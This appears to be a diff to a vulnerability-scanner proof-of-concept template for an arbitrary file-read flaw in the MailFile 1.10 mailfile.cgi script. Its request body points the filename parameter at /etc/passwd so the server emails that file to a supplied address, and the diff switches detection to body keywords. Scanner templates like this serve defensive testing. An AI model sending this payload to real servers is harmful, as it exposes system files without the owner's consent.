@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证目标服务器是否存在 MailFile 1.10 mailfile.cgi 任意文件读取漏洞。向 mailfile.cgi 发送 POST 请求，通过 filename 参数指定目标文件路径，若 CGI 脚本响应正常则表明目标存在该漏洞风险。"
+description = "通过 POST 请求向 mailfile.cgi 的 filename 参数传入目标文件路径（如 /etc/passwd），服务器将文件内容通过邮件发送至 email 参数指定地址，验证任意文件读取漏洞"
 id = "POC-AVE-2000-0713"
-name = "Oatmeal Studios MailFile 1.10 mailfile.cgi 任意文件读取漏洞 PoC"
+name = "MailFile 1.10 mailfile.cgi 任意文件读取 PoC"
 severity = "medium"
 tags = ["ave-2000-0713"]
 vuln_id = [
@@ -11,7 +11,7 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
@@ -19,7 +19,7 @@ path = "/{{BaseURL}}/cgi-bin/mailfile.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "real_name=test&email=test@test.com&filename=/etc/passwd"
+content = "filename=/etc/passwd&email=test@test.com"
 type = "raw"
 
 [poc.requests.headers]
@@ -27,5 +27,10 @@ Content-Type = "application/x-www-form-urlencoded"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "mailfile",
+    "sent",
+    "email",
+]
